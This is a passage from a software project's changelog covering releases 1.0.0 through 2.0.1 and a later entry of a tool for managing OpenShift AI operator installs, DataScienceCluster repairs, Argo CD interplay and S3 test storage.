    page shows the build Git set, whether the operator runs it (**Install
    pending** when Git moved to a build of the same version, which OLM does
    not install by itself), and a newer nightly in Quay as the image to put
    in Git.
  - Update becomes *Install the build the catalog serves*: it keeps the
    channel Git sets, deletes the old CSV, and deletes the Subscription only
    right before recreating it with Argo CD's tracking and labels, so Argo
    CD does not recreate it from Git in between (a self-heal sync that
    follows finds it unchanged). Any other image is refused before anything
    changes.
  - Re-deploy, Reinstall and *Create the DataScienceCluster* are off while
    Argo CD manages the operator, and DSC repairs and Diagnostics' *disable
    component* while it manages the DSC: Argo CD would undo them.
    Diagnostics' prerequisite-operator guidance says to add the operator in
    Git instead.
  - Update checks, after OLM reports success, that the installed CSV is the
    build it verified (`containerImage` and `createdAt` annotations), and
    reports `install_mismatch` otherwise instead of success.
- `GET /api/status` reports `subscription.managedBy`,
  `catalogSource.managedBy`, `dscManagedBy` and, under Argo CD,
  `catalogServes` (the catalog's head CSV, its build, and whether it is
  installed).

### Security

- Go 1.27.2 (CI, the image build and the GitHub workflows): fixes the
  net/http, HTTP/2, crypto/tls and net/textproto advisories GO-2026-6603,
  6605, 6607 to 6613 and 6617 that govulncheck reports with 1.27.1.

## [2.0.1] - 2026-10-07

### Upgrade notes

- Upgrading from v2.0.0 or any earlier build: download and run the
  `install.sh` of v2.0.1 (commands at the end of these notes; pass the
  options your install was made with, such as `--namespace`, `--app-name`
  and `--image-repo`). From a clone: `git checkout v2.0.1 && make upgrade`.
- Reload open app pages after upgrading: a DSC repair from a page loaded
  before v2.0.1 is refused with a "refresh and review" message.
- Same template as v2.0.0 (revision 4): no RBAC change, no full redeploy.

### Fixed

- RHOAI 3.6 nightlies serve DataScienceCluster v3: the Components page no
  longer fails with "GitHub returned HTTP 404" for
  `datasciencecluster_v1_datasciencecluster.yaml`. The DataScienceCluster,
  DSCInitialization, Platform and Dashboard CR API versions come from API
  discovery (preferred first, then newest first) instead of a fixed v2/v1
  list; DSC defaults accept an alm-examples example of any version, and the
  GitHub fallback tries the sample of each served version.
- A DSC is only compared with (and reset to, or created from) defaults of
  the version it is read at. When the operator's conversion webhook cannot
  convert it to the preferred version, it is read at the next version that
  works, the Components page says so, and a missing defaults version is
  explained instead of showing a sample URL.
- The Components page's "Edit in console" link uses the DSC's version
  instead of v2.
- DataScienceCluster v3 nests parts under a component (`dashboard.standard`,
  `kserve.nim`, `data.featureStore`). "Reset to version defaults" now lists
  each part it would switch to Removed, including the enabled parts of a
  component switched off, and both repairs refuse while the part's module
  could hang in deletion, as for whole components.
- A DSC repair runs only at the API version its preview was computed at; if
  the DSC is read at another version by then (for example after an operator
  update fixed the conversion), it asks to refresh and changes nothing.
  The reset dialog enables Confirm only when its defaults preview matches
  the version and operator the page compared with (otherwise it says the
  DataScienceCluster changed and offers Refresh), and a reset runs only if
  it would switch to Removed exactly the components the dialog listed.
- A part the installed CRD does not define (for example an old
  `dashboard.legacyPart`) is pruned by "Remove invalid fields" without the
  deletion checks of the component's module.

### Added

- Diagnostics "API versions": reports a RHOAI CRD version that the
  operator's conversion webhook cannot convert to (one problem per kind,
  with the API server's message, the versions that work, and read-only
  commands), as when a nightly's operator image is older than the CRDs of
  its bundle. Each served version is checked on its first object; with no
  object it could read, the check warns instead of passing. See
  [RUNBOOK §11.8](RUNBOOK.md#118-the-operator-cannot-convert-a-crd-version).
- The "vX.Y.Z is available" notice shows that release's installer as a
  command to copy (only for a plain https download URL, quoted), with the
  git route as the alternative. For this project
  it downloads from the public GitHub mirror, because the GitLab project's
  release assets need a sign-in; the GitLab release notes do the same. See [docs/UPGRADING.md](docs/UPGRADING.md#patch-and-minor-releases).

## [2.0.0] - 2026-10-06

### Upgrade notes

- **Requires a full redeploy** (template revision 4; v1.0.0 has revision 2).
  Use the `install.sh` of v2.0.0, or `git checkout v2.0.0 && make upgrade`.
  Deployments that still pull `:latest` stay on v1.x: `:latest` no longer
  moves to a new major version by itself. See [docs/UPGRADING.md](docs/UPGRADING.md).
- **RBAC changes:** the ClusterRole adds `get` on `operator.openshift.io`
  objects named `cluster` (prerequisite operands), `list` on cert-manager
  `Certificates`, and the SeaweedFS objects (`seaweedfs` Deployment and
  Service, `seaweedfs-pvc`, `seaweedfs-ingress`); it keeps `delete` on the
  MinIO objects only to remove them.
- **S3 test storage moves from MinIO to SeaweedFS** on the next storage setup
  or repair. SeaweedFS starts empty; the old `minio-pvc` is kept until
  teardown. Rollback steps: [RUNBOOK §10.1](RUNBOOK.md#101-migrate-storage-from-an-earlier-version).
- New template parameters `IMAGE_REPOSITORY` and `RELEASES_URL` (the update
  check); `install.sh` and `make` pass the repository they install from.

### Added

- Versioned releases: `vX.Y.Z` tags build an immutable `:vX.Y.Z` image, move
  `:vMAJOR`, and move `:latest` only within its major version (a manual CI job
  promotes it across majors). Pushes to `main` publish `:main` and the commit
  tag, never `:latest`. GitLab and GitHub Releases carry the notes,
  `install.sh` and `deploy/template.yaml`.
- `install.sh`, attached to every release: installs or upgrades exactly that
  release with only `oc` and `curl`, no clone. `make deploy`, `upgrade`,
  `rollback` and `resolve-image` run the same script.
- `make release VERSION=vX.Y.Z`, with the release guard (CHANGELOG entry, and
  a higher MAJOR whenever the template revision changes).
- The masthead shows the running release; a dismissible notice says when a
  newer release exists, and when it needs a full redeploy.
- Diagnostics explain why the DataScienceCluster is not ready (the DSC
  readiness doctor): classified causes per component, linked to the problems
  that fix them; a missing operand CR of a prerequisite operator; stale
  module roll-ups only across scans; Certificates that cert-manager has not
  issued, including a Ready Certificate whose Secret is gone.
- The Components page shows a not-ready component's classified cause.

### Changed

- The S3 test storage is SeaweedFS instead of MinIO, with recovery from
  interrupted setups; its status comes from the serving configuration, and
  an incomplete storage shows its reason as a warning.
- `TAG` defaults to the release tag HEAD is on; without one, `make deploy` and
  `make upgrade` ask for a release checkout or an explicit `TAG=main` /
  `TAG=<commit>`.
- The restart fix resolves `maxSurge` and `maxUnavailable` like the
  Deployment controller.

### Documentation

- A visual guide: README tour, a step-by-step QUICKSTART, UPGRADING (with the
  pre-v1 deployment variants verified live) and RUNBOOK troubleshooting, with
  annotated crops, light and dark screenshots, GIFs and Mermaid diagrams. All
  images come from a mock backend (`make docs-screenshots`), never a real cluster.

### Fixed

- Small UI text and layout issues found while capturing the docs: a missing
  full stop in the remote-operation banner, a sentence starting in lower case
  in the module back-off problem, a repeated tag in the Build Explorer compare
  header, the S3 storage row squeezing its text on mid-size windows, the S3
  storage title naming SeaweedFS while MinIO still runs, and "Not managed by
  this tool" shown for resources that do not exist.

### Security

- Test credentials are built at run time instead of being committed, so leak
  scanners do not flag them.
- SECURITY.md notes that SeaweedFS logs the S3 access key ID at startup.

## [1.0.0] - 2026-10-06

First release (template revision 2): the image is deployed by digest and
checked against the template of its own commit, the oauth-proxy cookie secret
lives in a Secret, RBAC is least-privilege with namespace-suffixed names,
cluster operations hold a cross-pod lock, and the UI covers Status,
Components, Build Explorer, Dashboard Dev, Test resources and Diagnostics.
